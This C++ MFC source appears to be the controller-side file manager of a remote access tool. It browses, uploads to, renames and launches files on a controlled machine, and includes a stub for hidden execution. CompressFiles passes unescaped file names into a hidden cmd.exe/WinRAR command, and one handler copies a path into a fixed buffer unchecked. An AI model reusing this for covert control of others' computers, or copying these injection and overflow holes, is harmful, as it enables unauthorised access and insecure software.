	//m_list_remote.SetRedraw(FALSE);

	if (ulLength != 0)
	{
		// 遍历发送来的数据显示到列表中
		for (int i = 0; i < 2; i++)
		{
			// 跳过Token   	//[Flag 1 HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
			char *szTravel = (char *)(szBuffer + 1);	

			//[1 HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
			for(char *szBase = szTravel; szTravel - szBase < ulLength - 1;)
			{
				char	*szFileName = NULL;
				DWORD	dwFileSizeHigh = 0; // 文件高字节大小
				DWORD	dwFileSizeLow = 0;  // 文件低字节大小
				int		iItem = 0;
				bool	bIsInsert = false;
				FILETIME	FileTime;

				int	iType = *szTravel ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i 为 0 时，列目录，i为1时列文件
				bIsInsert = !(iType == FILE_ATTRIBUTE_DIRECTORY) == i;

				//0==1     0==0   !1  0

				////[HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
				szFileName = ++szTravel;

				if (bIsInsert)
				{
					iItem = m_ControlList_Client.InsertItem(iItemIndex++, szFileName, GetServerIconIndex(szFileName, iType));
					m_ControlList_Client.SetItemData(iItem, iType == FILE_ATTRIBUTE_DIRECTORY);   //隐藏属性
					SHFILEINFO	sfi;
					SHGetFileInfo(szFileName, FILE_ATTRIBUTE_NORMAL | iType, &sfi,sizeof(SHFILEINFO), 
						SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
					m_ControlList_Client.SetItemText(iItem, 2, sfi.szTypeName);
				}

				// 得到文件大小
				szTravel += strlen(szFileName) + 1;
				if (bIsInsert)       
				{
					memcpy(&dwFileSizeHigh,szTravel, 4);
					memcpy(&dwFileSizeLow, szTravel + 4, 4);
					CString strFileSize;
					strFileSize.Format("%10d KB", (dwFileSizeHigh * (MAXDWORD+1)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
					m_ControlList_Client.SetItemText(iItem, 1, strFileSize);
					memcpy(&FileTime, szTravel + 8, sizeof(FILETIME));
					CTime	Time(FileTime);
					m_ControlList_Client.SetItemText(iItem, 3, Time.Format("%Y-%m-%d %H:%M"));	
				}
				szTravel += 16;
			}
		}
	}

	//	m_list_remote.SetRedraw(TRUE);
	// 恢复窗口
	m_ControlList_Client.EnableWindow(TRUE);
}

//从主控端向被控端进行拷贝
void CFileManagerDlg::OnLvnBegindragListServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;

	if (m_Client_File_Path.IsEmpty()||m_Server_File_Path.IsEmpty())
	{
		return;
	}

	//	m_ulDragIndex = pNMListView->iItem;   //保存要拖的项

	if(m_ControlList_Server.GetSelectedCount() > 1) //变换鼠标的样式 如果选择多项进行拖拽
	{
		m_hCursor = AfxGetApp()->LoadCursor(IDC_CURSOR_MDRAG);
	}
	else
	{
		m_hCursor = AfxGetApp()->LoadCursor(IDC_CURSOR_DRAG);
	}

	m_bDragging = TRUE;	
	m_DragControlList = &m_ControlList_Server; 
	m_DropControlList = &m_ControlList_Server;

	SetCapture();
	*pResult = 0;
}


void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_bDragging)    //我们只对拖拽感兴趣
	{	
		CPoint Point(point);	 //获得鼠标位置
		ClientToScreen(&Point); //转成相对于自己屏幕的

		//根据鼠标获得窗口句柄
		CWnd* pDropWnd = WindowFromPoint(Point);   //值所在位置 有没有控件

		if(pDropWnd->IsKindOf(RUNTIME_CLASS (CListCtrl)))   //属于我们的窗口范围内
		{
			SetCursor(m_hCursor);  

			return;
		}
		else
		{
			SetCursor(LoadCursor(NULL,IDC_NO));   //超出窗口换鼠标样式
		}
	}	

	CDialog::OnMouseMove(nFlags, point);
}


void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)
{
	if (m_bDragging)
	{
		ReleaseCapture();  //释放鼠标的捕获

		m_bDragging = FALSE;

		CPoint Point(point);    //获得当前鼠标的位置相对于整个屏幕的
		ClientToScreen (&Point); //转换成相对于当前用户的窗口的位置

		CWnd* DropWnd = WindowFromPoint (Point);   //获得当前的鼠标下方有无控件

		if (DropWnd->IsKindOf (RUNTIME_CLASS (CListCtrl))) //如果是一个ListControl
		{
			m_DropControlList = (CListCtrl*)DropWnd;       //保存当前的窗口句柄

			DropItemOnList(); //处理传输
		}
	}	

	CDialog::OnLButtonUp(nFlags, point);
}

VOID CFileManagerDlg::DropItemOnList()
{
	if (m_DragControlList==m_DropControlList)
	{
		return;
	}

	if ((CWnd *)m_DropControlList == &m_ControlList_Server)
	{
		//	m_nDropIndex = m_list_local.GetSelectionMark();
		//	OnIdtRemoteCopy();
	}
	else if ((CWnd *)m_DropControlList == &m_ControlList_Client)
	{
		//m_nDropIndex = m_list_remote.GetSelectionMark();
		OnCopyServerToClient();
	}
	else
	{
		return;
	}
	// 重置
	//m_nDropIndex = -1;
}

VOID CFileManagerDlg::OnCopyServerToClient() //从主控端到被控端
{
	m_Remote_Upload_Job.RemoveAll();                                                                   
	POSITION Pos = m_ControlList_Server.GetFirstSelectedItemPosition();
	while(Pos) 
	{
		int iItem = m_ControlList_Server.GetNextSelectedItem(Pos);
		CString	strFileFullPath = NULL;

		if (0)
			//if (m_IsLocalFinding)
		{/* "2015-02-09 12:550 .-. Deja Ver (Ft. Tony Dize).mp3"	*/

			//strFileName = m_ControlList_Server.GetItemText(iItem, 3) + m_list_local.GetItemText(nItem, 0); 
		}
		else
		{
			strFileFullPath = m_Server_File_Path + m_ControlList_Server.GetItemText(iItem, 0);
		}
		// 如果是目录
		if (m_ControlList_Server.GetItemData(iItem))
		{
			strFileFullPath += '\\';
			FixedServerToClientDirectory(strFileFullPath.GetBuffer(0));
		}
		else
		{
			// 添加到上传任务列表中去
			HANDLE hFile = CreateFile(strFileFullPath,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,
				NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

			if (hFile==INVALID_HANDLE_VALUE)
			{
				continue;
			}
			m_Remote_Upload_Job.AddTail(strFileFullPath);

			CloseHandle(hFile);
		}
	} 
	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, "文件夹为空", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendToClientJob(); //发送第一个任务
}

BOOL CFileManagerDlg::FixedServerToClientDirectory(LPCTSTR szDircetoryFullPath)    
{
	CHAR	szBuffer[MAX_PATH];
	CHAR	*szSlash = NULL;
	memset(szBuffer, 0, sizeof(szBuffer));

	if (szDircetoryFullPath[strlen(szDircetoryFullPath) - 1] != '\\')
		szSlash = "\\";
	else
		szSlash = "";

	sprintf(szBuffer, "%s%s*.*", szDircetoryFullPath, szSlash);

	WIN32_FIND_DATA	wfd;
	HANDLE hFind = FindFirstFile(szBuffer, &wfd);   //C;|1\*.*
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;
	do
	{ 
		if (wfd.cFileName[0] == '.') 
			continue; // 过滤这两个目录 '.'和'..'
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{ 
			CHAR szv1[MAX_PATH];
			sprintf(szv1, "%s%s%s", szDircetoryFullPath,szSlash, wfd.cFileName);
			FixedServerToClientDirectory(szv1); // 如果找到的是目录，则进入此目录进行递归 
		} 
		else 
		{ 
			CString strFileFullPath;
			strFileFullPath.Format("%s%s%s", szDircetoryFullPath, szSlash, wfd.cFileName); 
			m_Remote_Upload_Job.AddTail(strFileFullPath);
			// 对文件进行操作 
		} 
	} while (FindNextFile(hFind, &wfd)); 
	FindClose(hFind); // 关闭查找句柄
	return true;
}

VOID CFileManagerDlg::EndCopyServerToClient() //如果有任务就继续发送没有就恢复界面	                       
{
	m_ulCounter = 0;
	m_OperatingFileLength = 0;

	ShowProgress();
	if (m_Remote_Upload_Job.IsEmpty()|| m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		m_bIsStop = FALSE;
		EnableControl(TRUE);
		m_ulTransferMode = TRANSFER_MODE_NORMAL;	
		GetClientFileList(".");
	}
	else
	{
		Sleep(5);

		SendToClientJob();
	}
	return;
}

BOOL CFileManagerDlg::SendToClientJob() //从主控端到被控端的发送任务
{
	if (m_Remote_Upload_Job.IsEmpty())
		return FALSE;

	CString	strDestDirectory = m_Client_File_Path;

	m_strSourFileFullPath = m_Remote_Upload_Job.GetHead();    //获得第一个任务的名称

	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	CString	strString = m_strSourFileFullPath;               // 远程文件

	// 得到要保存到的远程的文件路径
	strString.Replace(m_Server_File_Path, m_Client_File_Path);  //D:1.txt     E:1.txt
	m_strDestFileFullPath = strString;  //修正好的名字

	hFile = CreateFile(m_strSourFileFullPath.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, 
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);   //获得要发送文件的大小
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);

	m_OperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;
	CloseHandle(hFile);
	// 构造数据包，发送文件长度

	ULONG	ulLength =strString.GetLength() + 10;
	BYTE	*szBuffer = (BYTE *)LocalAlloc(LPTR, ulLength);
	memset(szBuffer, 0, ulLength);

	szBuffer[0] = COMMAND_FILE_SIZE;

	//[Flag 0001 0001 E:\1.txt\0 ]

	//向被控端发送消息 COMMAND_FILE_SIZE 被控端会执行CreateLocalRecvFile函数
	//从而分成两中情况一种是要发送文件已经存在就会接收到
	// TOKEN_GET_TRANSFER_MODE 
	//另一种是被控端调用GetFileData函数从而接收到TOKEN_DATA_CONTINUE

	memcpy(szBuffer + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(szBuffer + 5, &dwSizeLow, sizeof(DWORD));

	memcpy(szBuffer + 9, strString.GetBuffer(0), strString.GetLength() + 1);

	m_iocpServer->OnClientPreSending(m_ContextObject,szBuffer,ulLength);

	LocalFree(szBuffer);

	// 从下载任务列表中删除自己
	m_Remote_Upload_Job.RemoveHead();
	return TRUE;
}


void CFileManagerDlg::OnNMRClickListServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	CMenu	Menu;
	Menu.LoadMenu(IDR_MENU_FILE_OPERATION);   
	CMenu*	SubMenu = Menu.GetSubMenu(0);               
	CPoint	Point;
	GetCursorPos(&Point);
	SubMenu->DeleteMenu(2, MF_BYPOSITION);
	if (m_ControlList_Server.GetSelectedCount() == 0)    
	{
		int	iCount = SubMenu->GetMenuItemCount();
		for (int i = 0; i < iCount; i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}

	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);	

	*pResult = 0;
}


void CFileManagerDlg::OnOperationServerRun()
{
	CString	strFileFullPath;
	strFileFullPath = m_Server_File_Path + m_ControlList_Server.GetItemText(m_ControlList_Server.GetSelectionMark(), 0);
	ShellExecute(NULL, "open", strFileFullPath, NULL, NULL, SW_SHOW);   //CreateProcess 
}


void CFileManagerDlg::OnOperationRename()
{
	POINT Point;
	GetCursorPos(&Point);
	if (GetFocus()->m_hWnd == m_ControlList_Server.m_hWnd)
	{
		m_ControlList_Server.EditLabel(m_ControlList_Server.GetSelectionMark());
	}
	else
	{
		m_ControlList_Client.EditLabel(m_ControlList_Client.GetSelectionMark());
	}	
}


void CFileManagerDlg::OnLvnEndlabeleditListServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);

	CString strNewFileName, strExistingFileFullPath, strNewFileFullPath;
	m_ControlList_Server.GetEditControl()->GetWindowText(strNewFileName);

	strExistingFileFullPath = m_Server_File_Path + m_ControlList_Server.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileFullPath = m_Server_File_Path + strNewFileName;
	*pResult = ::MoveFile(strExistingFileFullPath.GetBuffer(0), strNewFileFullPath.GetBuffer(0));
}

void CFileManagerDlg::OnNMRClickListClient(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	CMenu	Menu;
	Menu.LoadMenu(IDR_MENU_FILE_OPERATION);   
	CMenu*	SubMenu = Menu.GetSubMenu(0);               
	CPoint	Point;
	GetCursorPos(&Point);
	SubMenu->DeleteMenu(1, MF_BYPOSITION);
	if (m_ControlList_Client.GetSelectedCount() == 0)    
	{
		int	iCount = SubMenu->GetMenuItemCount();
		for (int i = 0; i < iCount; i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}

	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);	
	*pResult = 0;
}


void CFileManagerDlg::OnOperationClientShowRun()
{
	CString	strFileFullPath;
	strFileFullPath = m_Client_File_Path + m_ControlList_Client.GetItemText(m_ControlList_Client.GetSelectionMark(), 0);
	ULONG	ulLength = strFileFullPath.GetLength() + 2;
	BYTE	szBuffer[MAX_PATH+10];
	szBuffer[0] = COMMAND_OPEN_FILE_SHOW;
	memcpy(szBuffer + 1, strFileFullPath.GetBuffer(0), ulLength - 1);
	m_iocpServer->OnClientPreSending(m_ContextObject, szBuffer, ulLength);
}


void CFileManagerDlg::OnOperationClientHideRun()
{
	// TODO: 在此添加命令处理程序代码
}


void CFileManagerDlg::OnLvnEndlabeleditListClient(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);

	CString strNewFileName, strExistingFileFullPath, strNewFileFullPath;
	m_ControlList_Client.GetEditControl()->GetWindowText(strNewFileName);

	strExistingFileFullPath = m_Client_File_Path + m_ControlList_Client.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileFullPath = m_Client_File_Path + strNewFileName;

	if (strExistingFileFullPath != strNewFileFullPath)
	{
		UINT   ulLength = strExistingFileFullPath.GetLength() + strNewFileFullPath.GetLength() + 3;
		LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, ulLength);
		szBuffer[0] = COMMAND_RENAME_FILE; //向被控端发送消息
		memcpy(szBuffer + 1, strExistingFileFullPath.GetBuffer(0), strExistingFileFullPath.GetLength() + 1);
		memcpy(szBuffer + 2 + strExistingFileFullPath.GetLength(), 
			strNewFileFullPath.GetBuffer(0), strNewFileFullPath.GetLength() + 1);
		m_iocpServer->OnClientPreSending(m_ContextObject, szBuffer, ulLength);
		LocalFree(szBuffer);

		GetClientFileList(".");
	}

	*pResult = 0;
}


void CFileManagerDlg::OnOperationCompress()
{
	POINT Point;
	GetCursorPos(&Point);
	if (GetFocus()->m_hWnd == m_ControlList_Server.m_hWnd)
	{	
		ServerCompress(1);
	}
}


VOID  CFileManagerDlg::ServerCompress(ULONG ulType)
{
	POSITION Pos = m_ControlList_Server.GetFirstSelectedItemPosition();

	CString strString;

	while(Pos)    
	{
		int  iItem = m_ControlList_Server.GetNextSelectedItem(Pos);
		strString += m_Server_File_Path + m_ControlList_Server.GetItemText(iItem, 0);   //C:\1.txt  C:\2.txt  s
		strString += _T(" ");
	} 

	if (!strString.IsEmpty())
	{
		CString strRARFileFullPath;

		strRARFileFullPath += m_Server_File_Path;
		CFileCompress Dlg(this,ulType);

		if (Dlg.DoModal()==IDOK)
		{
			if (Dlg.m_EditRarName.IsEmpty())
			{
				MessageBox("ERROR");
				return;
			}

			strRARFileFullPath += Dlg.m_EditRarName;
			strRARFileFullPath += ".rar";
			CompressFiles(strRARFileFullPath.GetBuffer(strRARFileFullPath.GetLength()),
				strString.GetBuffer(strString.GetLength()),ulType);
		}	
	}
}


BOOL  CFileManagerDlg::CompressFiles(PCSTR strRARFileFullPath,PSTR strString,ULONG ulType)
{
	// ibck 是后台运行
	PSTR szExePath =  "/c c:\\progra~1\\winrar\\winrar.exe a -ad -ep1 -ibck ";
	//"/c c:\\progra~1\\winrar\\winrar.exe -x -ep1 -ibck " ;
	ULONG ulLength  =strlen(szExePath) + strlen(strRARFileFullPath)+strlen(strString)+2;

	PSTR szBuffer = (PSTR)malloc(sizeof(CHAR)* ulLength);
	StringCchCopyN(szBuffer , ulLength , szExePath , strlen(szExePath));
	StringCchCatN( szBuffer ,ulLength , strRARFileFullPath , strlen(strRARFileFullPath) );
	StringCchCatN( szBuffer ,ulLength , " " ,1);
	StringCchCatN( szBuffer ,ulLength ,  strString , strlen(strString));

	if (ulType==1)
	{
		SHELLEXECUTEINFO sei = {0};
		sei.cbSize = sizeof sei;
		sei.lpVerb = "open";
		sei.lpFile = "c:\\windows\\system32\\cmd.exe";
		sei.lpParameters = szBuffer;
		sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
		BOOL fReturn = ShellExecuteEx(&sei);

		CloseHandle(sei.hProcess);
		return (fReturn);
	} 
	return TRUE;
}
